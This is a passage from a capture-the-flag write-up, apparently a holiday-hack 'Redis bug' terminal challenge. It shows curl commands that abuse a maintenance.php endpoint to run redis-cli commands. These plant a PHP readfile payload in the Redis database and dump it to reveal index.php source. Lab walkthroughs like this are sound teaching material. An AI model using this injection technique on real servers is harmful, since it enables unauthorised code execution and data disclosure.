+player@c3b0b1098583:~$ 
+</code></pre>
+<h4 id="step-13">Step 13</h4>
+<p>Therefore, we can now add a php function to print the <code>index.php</code> page
+source when executed as the page loads. Since we can't modify anything on the
+web server, we can load the php function as the value of a key-value pair into 
+the database</p>
+<pre><code class="language-bash">player@c3b0b1098583:~$ curl 'http://localhost/maintenance.php?cmd=set,exploit,&lt;?php+echo+readfile(&quot;index.php&quot;);+?&gt;'
+Running: redis-cli --raw -a '&lt;password censored&gt;' 'set' 'exploit' '&lt;?php echo readfile(&quot;index.php&quot;); ?&gt;'
+
+OK
+player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=save
+Running: redis-cli --raw -a '&lt;password censored&gt;' 'save'
+
+OK
+player@c3b0b1098583:~$
+</code></pre>
+<h4 id="step-14">Step 14</h4>
+<p>Let's see if it works</p>
+<pre><code class="language-bash">player@c3b0b1098583:~$ curl http://localhost/dump.php --output -
+REDIS0009�      redis-ver5.0.3�
+�edis-bits�@�ctime�,O�_used-mem�@?
+ aof-preamble���example1The site is in maintenance modeexploit$&lt;?php
+# We found the bug!!
+#
+#         \   /
+#         .\-/.
+#     /\ ()   ()
+#       \/~---~\.-~^-.
+# .-~^-./   |   \---.
+#      {    |    }   \
+#    .-~\   |   /~-.
+#   /    \  A  /    \
+#         \/ \/
+# 
+echo &quot;Something is wrong with this page! Please use http://localhost/maintenance.php to se
+e if you can figure out what's going on&quot;
+?&gt;
+48example2#We think there's a bug in index.php��X^M�0�Iplayer@c3b0b1098583:~$
+</code></pre>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../can-bus-investigation/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                Terminal/CAN Bus Investigations
+              </div>
+            </div>
+          </a>
+        
+        
+          <a href="../elf-code/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                Terminal/Elf Code
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../assets/javascripts/vendor.93c04032.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.83e5331e.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../../..",
+          features: [],
+          search: Object.assign({
+            worker: "../../../assets/javascripts/worker/search.8c7e0a7e.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+    
+  </body>
+</html>
